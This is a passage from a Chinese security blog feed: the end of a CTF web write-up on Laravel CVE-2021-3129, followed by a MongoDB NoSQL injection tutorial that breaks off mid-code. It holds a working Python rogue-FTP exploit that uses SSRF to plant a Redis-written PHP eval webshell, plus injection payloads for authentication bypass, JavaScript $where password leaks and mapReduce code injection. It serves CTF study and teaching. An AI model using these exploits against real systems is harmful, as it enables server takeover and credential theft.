class="hljs-comment">//fmt.Println(s.Get(&quot;checkPlayerMoney&quot;))</span><br>s.Save()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">randomChar</span><span class="hljs-params">(l <span class="hljs-keyword">int</span>)</span> []<span class="hljs-title">byte</span></span> &#123;<br>output := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">byte</span>, l)<br>rand.Read(output)<br><span class="hljs-keyword">return</span> output<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4aa4f21ebdf643e3be9df6440818c414.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这个题其实借鉴了wmctf的一个go题：<a href="https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/">https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/</a></p><h1 id="Cross-The-Side"><a href="#Cross-The-Side" class="headerlink" title="Cross The Side"></a>Cross The Side</h1><p>Laravel v8.26.1 (PHP v7.4.15）远程代码执行漏洞（CVE-2021-3129）</p><p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。但是我用这个打的时候一直报错php内存耗尽，应该是由于该网站的日志文件太大，超出内存，无法进行利，估计是phpini的配置不同专门限制了这种方法，可惜没有看到网上还有一种做法，可以联合ssrf打内网服务。</p><p>这里信息搜集的时候是可以看到dump.rdb，提示了开启了redis服务，这里就是可以用<code>file_get_contents</code>和<code>file_get_contents</code>来打redis了，因为这两个函数不支持gopher协议，这里采用ftp协议，上传文件时请求我们起的恶意服务器，告诉客户端获取数据的ip和端口去下载数据，<code>file_put_contents</code>时再将ip和端口重定向到内网的redis服务，然后发送我们的payload恶意数据，这样就实现了ssrf获取shell。</p><p>大致过程如图</p><p><img src="https://img-blog.csdnimg.cn/72f52eda18cc4008ad18ece1d48c2085.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>贴一下exp,ftp状态码可参考</p><p><a href="https://blog.csdn.net/qq981378640/article/details/51254177">https://blog.csdn.net/qq981378640/article/details/51254177</a></p><p><a href="http://www.hackdig.com/06/hack-372823.htm">http://www.hackdig.com/06/hack-372823.htm</a></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">payload = unquote(<span class="hljs-string">&quot;%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B123%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;</span>)<br>payload = payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>port = <span class="hljs-number">23</span><br>sk = socket.socket()<br>sk.bind((host, port))<br>sk.listen(<span class="hljs-number">5</span>)<br><span class="hljs-comment"># ftp被动模式的passvie port,监听到1234</span><br>sk2 = socket.socket()<br>sk2.bind((host, <span class="hljs-number">1234</span>))<br>sk2.listen()<br><span class="hljs-comment"># 计数器，用于区分是第几次ftp连接</span><br>count = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    conn, address = sk.accept()<br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># USER aaa\r\n  客户端传来用户名</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;220 ready\n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 ready\n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;215 \n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># SIZE /123\r\n  客户端询问文件/123的大小</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;213 3 \n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;300 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># EPSV\r\n&#x27;</span><br>    conn.send(<span class="hljs-string">b&quot;200 \n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))   <span class="hljs-comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 192,168,160,129,4,210\n&quot;</span>)  <span class="hljs-comment"># 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span><br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;227 127,0,0,1,24,235\n&quot;</span>)  <span class="hljs-comment"># 端口计算规则：24*256+235=9000</span><br>    <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))  <span class="hljs-comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;125 \n&quot;</span>) <span class="hljs-comment"># 告诉客户端可以开始数据链接了</span><br>        <span class="hljs-comment"># 新建一个socket给服务端返回我们的payload</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;建立连接!&quot;</span>)<br>        conn2, address2 = sk2.accept()<br>        conn2.send(payload)<br>        conn2.close()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;断开连接!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        conn.send(<span class="hljs-string">b&quot;150 \n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(conn.recv(<span class="hljs-number">20</span>))<br>        exit()<br>    <span class="hljs-comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span><br>    <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span>:<br>        conn.send(<span class="hljs-string">b&quot;226 \n&quot;</span>)<br>    conn.close()<br>    count += <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>下篇再总结下ftp打mysql打redis等等攻击。</p><h1 id="Only-4"><a href="#Only-4" class="headerlink" title="Only 4"></a>Only 4</h1><p>预期解需要扫到<code>searlize.php</code>显然有点扯</p><p>非预期是日志文件包含getshell。直接包含PHP_SESSION_UPLOAD_PROGRESS。session文件在/var/lib/php5/sess_rayi。脚本就不贴了</p><h1 id="No-sql"><a href="#No-sql" class="headerlink" title="No sql"></a>No sql</h1><p>cms框架来源于<a href="http://cn-sec.com/archives/335315.html">http://cn-sec.com/archives/335315.html</a> 考察nosql注入</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nosql</title>
    <link href="/2021/09/20/2021-10-nosql%E6%B3%A8%E5%85%A5(1)/"/>
    <url>/2021/09/20/2021-10-nosql%E6%B3%A8%E5%85%A5(1)/</url>
    
    <content type="html"><![CDATA[<h1 id="Mogodb数据库"><a href="#Mogodb数据库" class="headerlink" title="Mogodb数据库"></a>Mogodb数据库</h1><p>在 <a href="https://cloud.tencent.com/product/cdb?from=10680">MySQL</a> 中，我们所熟知的几个最常见的概念是数据库 (Database)、表 (Table)、字段 (Column)、记录 (Record)、索引 (Index)，这些术语映射到 MongoDB 中大概等价于数据库 (Database)、集合 (Collection)、域 (Field)、文档 (Document)、索引 (Index)。一些基本操作可以看文档</p><h1 id="经典注入方式"><a href="#经典注入方式" class="headerlink" title="经典注入方式"></a>经典注入方式</h1><h3 id="永真注入"><a href="#永真注入" class="headerlink" title="永真注入"></a>永真注入</h3><p>利用的原理类似于万能密码，使查询的判定结果永远为true</p><p>例如当为如下查询语句时，当get传参为<code>?username[$ne]=1&amp;password[$ne]=1</code>则传入mogodb后成为了一个条件查询。即为查询username和password不等于1的数据，当然这只是一个简单的例子，这里也可以用其他的条件操作符。</p><p><img src="https://img-blog.csdnimg.cn/36584b6cdcc5432a80bfeac368c97e18.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment"># 查询语句</span><br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Query(<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;uname&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>],<br>    <span class="hljs-string">&#x27;pwd&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>));<br><span class="hljs-comment"># 执行语句</span><br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;executeQuery(<span class="hljs-string">&#x27;test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;toArray();<br></code></pre></div></td></tr></table></figure><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>我们都知道在 SQL 时代拼接字符串容易造成 SQL 注入，NoSQL 也有类似问题，但是现在无论是 PHP 的 MongoDB driver 还是 node.js 的 mongoose 都必须要求查询条件必须是一个数组或者 query 对象了，因此简单看一下就好。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">string</span> query =<span class="hljs-string">&quot;&#123; username: &#x27;&quot;</span> + <span class="hljs-variable">$username</span> + <span class="hljs-string">&quot;&#x27;, password: &#x27;&quot;</span> + <span class="hljs-variable">$password</span> + <span class="hljs-string">&quot;&#x27; &#125;&quot;</span>  <span class="hljs-comment">#查询语句</span><br></code></pre></div></td></tr></table></figure><p>这里构造payload</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">username=admin<span class="hljs-string">&#x27;,&#123;$or:[&#123;&#125;,&#123;&#x27;</span>a<span class="hljs-string">&#x27;:&#x27;</span>a&amp;password=<span class="hljs-string">&#x27;&#125;]</span><br></code></pre></div></td></tr></table></figure><p>这样最终的查询语句就变为</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">&#123; username: <span class="hljs-string">&#x27;admin&#x27;</span>,&#123;<span class="hljs-variable">$or</span>:[&#123;&#125;,&#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>, password: <span class="hljs-string">&#x27;&#x27;</span>&#125;] &#125;<br>在后端中即为：&#123; username: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$or</span>: [ &#123;&#125;, &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>, password:<span class="hljs-string">&#x27;&#x27;</span>&#125;]&#125;<br></code></pre></div></td></tr></table></figure><h3 id="JavaScript-注入"><a href="#JavaScript-注入" class="headerlink" title="JavaScript 注入"></a><strong>JavaScript 注入</strong></h3><p>我们知道 MongDB Server 是支持 JavaScript 语言的，这样给开发人员带来了很多非常方便的使用方法，但也是因为它本身的灵活性，造成了 JavaScript 注入。这里有个例子是一个祥云杯的一个题，那个是用node.js实现的一个mongodb查询，当时是可以使用nodejs报错机制来将密码带出来。</p><p>查询语句如下</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">let</span> docs = <span class="hljs-keyword">await</span> User.$where(<span class="hljs-string">`this.username == &quot;admin&quot; &amp;&amp; hex_md5(this.password) == &quot;<span class="hljs-subst">$&#123;token.toString()&#125;</span>&quot;`</span>).exec()<br></code></pre></div></td></tr></table></figure><p>这里可以使用如下payload进行报错。</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span class="hljs-string">&quot;||(()=&gt;&#123;throw Error(this.password)&#125;)()==&quot;</span>admin<br></code></pre></div></td></tr></table></figure><h5 id="where-操作符"><a href="#where-操作符" class="headerlink" title="$where 操作符"></a><strong>$where 操作符</strong></h5><p>在 MongoDB 中 $where 操作符是可以执行 JavaScript 语句的，在 MongoDB 2.4 之前，通过 $where 操作符使用<code>map-reduce</code>、<code>group</code>命令可以访问到 mongo shell 中的全局函数和属性。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$function</span> = <span class="hljs-string">&quot;function() &#123;if(this.uname == &#x27;<span class="hljs-subst">$uname</span>&#x27; &amp;&amp; this.pwd == &#x27;<span class="hljs-subst">$pwd</span>&#x27;) return &#123;&#x27;username&#x27;: this.uname, &#x27;password&#x27;: this.pwd&#125;&#125;&quot;</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> MongoDB\Driver\Query(<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;$where&#x27;</span> =&gt; <span class="hljs-variable">$function</span><br>));<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$manager</span>-&gt;executeQuery(<span class="hljs-string">&#x27;test.users&#x27;</span>, <span class="hljs-variable">$query</span>)-&gt;toArray();<br></code></pre></div></td></tr></table></figure><p>MongoDB&lt;2.4之前可以访问到全局属性</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">?username=<span class="hljs-string">&#x27;||1) return &#123;&#x27;</span>username<span class="hljs-string">&#x27;: tojson(db.getCollectionNames()), &#x27;</span>password<span class="hljs-string">&#x27;: &#x27;</span>hacked<span class="hljs-string">&#x27;&#125;&#125;//&amp;password=1</span><br></code></pre></div></td></tr></table></figure><p>这里也存在nosql的万能密码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">?username=<span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-number">1</span>&amp;pwd=<span class="hljs-number">1</span><br>?username=<span class="hljs-number">1</span>&amp;pwd=admin<span class="hljs-string">&#x27;||&#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br></code></pre></div></td></tr></table></figure><h4 id="mapReduce"><a href="#mapReduce" class="headerlink" title="mapReduce"></a><strong>mapReduce</strong></h4><p>看一下官方文档给的例子</p><p><img src="https://img-blog.csdnimg.cn/24aea38e18414b5dbc2452ae94c9fd76.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>Map 函数和 Reduce 函数可以使用 JavaScript 来实现，使得 MapReduce 的使用非常灵活和强大。但是同样也带来了隐患，假设有这样的一个业务场景，数据库中存储了一个<code>store</code>集合，有一系列商品的名称、价格和数量，我们想得到相同商品的价格或者数量的总和，代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">require_once __DIR__ . <span class="hljs-string">&quot;/vendor/autoload.php&quot;</span>;<br>$param = $_POST[<span class="hljs-string">&#x27;param&#x27;</span>];<br>$collection = (<span class="hljs-keyword">new</span> MongoDB\Client)-&gt;test-&gt;stores;<br>$map = <span class="hljs-string">&quot;function() &#123;</span><br><span class="hljs-string">        for (var i = 0; i &lt; this.items.length; i++) &#123;</span><br><span class="hljs-string">      emit(this.name, this.items[i].$param);    &#125;</span><br><span class="hljs-string">        &#125;&quot;</span>;<br>$reduce = <span class="hljs-string">&quot;function(name, sum) &#123; return Array.sum(sum); &#125;&quot;</span>;<br>$opt = <span class="hljs-string">&quot;&#123; out: &#x27;totals&#x27; &#125;&quot;</span>;<br>$results = $collection-&gt;mapReduce($map, $reduce, $out);<br><br>这里map中emit第一个参数为需要分组的字段名，第二个参数为需要进行统计的字段名<br>reduce函数参数<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reduce</span>(<span class="hljs-params">key, values</span>)</span>&#123; <span class="hljs-comment">// 统计字段处理 &#125;</span><br>key： 指分组字段（emit的param1）对应的值；<br>values：指需要统计的字段（emit的param2）值组成的数组。<br></code></pre></div></td></tr></table></figure><p>该代码应该在<code>$param</code>给定的字段上求和，但是这同样给了攻击者可乘之机，如果<code>$param</code>是这样：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">a);&#125;&#125;,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">kv</span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;, &#123; <span class="hljs-attr">out</span>: ‘x’ &#125;);<br>db.injection.insert(&#123;<span class="hljs-attr">success</span>:<span class="hljs-number">1</span>&#125;); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; &#123; emit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>那么在 MongoDB 中就相当于执行了下面这条语句：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">this</span>.items.length; i++) &#123;<br>emit(<span class="hljs-built_in">this</span>.name, <span class="hljs-built_in">this</span>.items[i].a);<br>&#125;<br>&#125;,<br><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">kv</span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; &#125;, &#123; <span class="hljs-attr">out</span>: <span class="hljs-string">&#x27;x&#x27;</span> &#125;);<br>db.injection.insert(&#123;<span class="hljs-attr">success</span>:<span class="hljs-number">1</span>&#125;); <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>db.stores.mapReduce(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123; &#123; emit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>); &#125; &#125;,<br><span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">name, sum</span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">Array</span>.sum(sum); &#125;, &#123; <span class="hljs-attr">out</span>: <span class="hljs-string">&#x27;totals&#x27;</span> &#125;);<span class="hljs-string">&quot;</span><br></code></pre></div></td></tr></table></figure><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>和sql盲注区别不大</p><h1 id="操作实例"><a href="#操作实例" class="headerlink" title="操作实例"></a>操作实例</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&quot;/vendor/autoload.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">auth</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>    <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;users;<br>    <span class="hljs-variable">$raw_query</span> = <span class="hljs-string">&#x27;&#123;&quot;username&quot;: &quot;&#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;&quot;, &quot;password&quot;: &quot;&#x27;</span>.<span class="hljs-variable">$password</span>.<span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>;<br>    <span class="hljs-variable">$document</span> = <span class="hljs-variable">$collection</span>-&gt;findOne(json_decode(<span class="hljs-variable">$raw_query</span>));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$document</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$document</span>-&gt;password)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user</span> = auth(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$user</span> = auth(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>) &#123;<br>        setcookie(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>        setcookie(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span> == <span class="hljs-literal">true</span>): <span class="hljs-meta">?&gt;</span><br>    Welcome!<br>    &lt;div&gt;<br>        Group most common news by<br>        &lt;a href=<span class="hljs-string">&quot;?filter=<span class="hljs-subst">$category</span>&quot;</span>&gt;category&lt;/a&gt; |<br>        &lt;a href=<span class="hljs-string">&quot;?filter=<span class="hljs-subst">$public</span>&quot;</span>&gt;publicity&lt;/a&gt;&lt;br&gt;<br>    &lt;/div&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$filter</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filter&#x27;</span>];<br>        <span class="hljs-variable">$collection</span> = (<span class="hljs-keyword">new</span> MongoDB\Client(<span class="hljs-string">&#x27;mongodb://localhost:27017/&#x27;</span>))-&gt;test-&gt;news;<br>        <span class="hljs-variable">$pipeline</span> = [<br>            [<span class="hljs-string">&#x27;$group&#x27;</span> =&gt; [<span class="hljs-string">&#x27;_id&#x27;</span> =&gt; <span class="hljs-string">&#x27;$category&#x27;</span>, <span class="hljs-string">&#x27;count&#x27;</span> =&gt; 